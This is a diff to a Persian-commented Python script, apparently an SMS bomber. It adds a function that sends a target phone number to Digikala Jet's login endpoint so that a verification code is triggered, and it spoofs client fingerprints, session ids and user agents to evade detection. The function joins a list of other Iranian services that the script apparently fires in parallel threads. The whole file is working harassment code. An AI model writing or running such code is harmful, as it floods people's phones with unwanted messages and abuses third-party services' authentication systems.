@@ -63,6 +63,68 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
+def DigikalaJet(phone):
+    try:
+        url = "https://api.digikalajet.ir/user/login-register/"
+        
+        # فرمت شماره
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
+        
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json",
+            "X-Request-UUID": str(uuid.uuid4()),
+            "ClientId": f"FINGERPRINT-{uuid.uuid4().hex[:20]}",
+            "ClientOs": "iOS",
+            "Client": "mobile",
+            "product-mode": "shop_product",
+            "session": f"{uuid.uuid4()}-V2{random.randint(1000000000, 9999999999)}",
+            "app-id": str(uuid.uuid4()),
+            "clientid-v2": f"FINGERPRINTV2-{uuid.uuid4().hex[:20]}",
+            "User-Agent": random.choice(user_agents),
+            "Origin": "https://digikalajet.ir",
+            "Referer": "https://digikalajet.ir/",
+        }
+        
+        payload = {
+            "phone": formatted_phone
+        }
+        
+        response = requests.post(
+            url, 
+            json=payload, 
+            headers=headers, 
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] DigikalaJet Status: {response.status_code}{a}')
+        print(f'{y}[Debug] DigikalaJet Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201, 202]:
+            try:
+                data = response.json()
+                if data.get("success") or data.get("status") == "success":
+                    print(f'{g}(DigikalaJet) Code Sent{a}')
+                    return True
+                else:
+                    print(f'{r}[-] DigikalaJet Failed: {data.get("message", "Unknown error")}{a}')
+                    return False
+            except:
+                if "success" in response.text.lower() or "sent" in response.text.lower():
+                    print(f'{g}(DigikalaJet) Code Sent{a}')
+                    return True
+                return False
+        else:
+            print(f'{r}[-] DigikalaJet HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] DigikalaJet Exception: {e}{a}')
+        return False
+
+
+
 def Sandalestan(phone):
     try:
         session = requests.Session()
@@ -508,7 +570,7 @@ def nillarayeshi(phone):
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [SibApp, ShahreSandal, Footini, Sandalestan, Balad, nillarayeshi]
+services = [Balad, DigikalaJet, Footini, nillarayeshi, ShahreSandal, SibApp]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
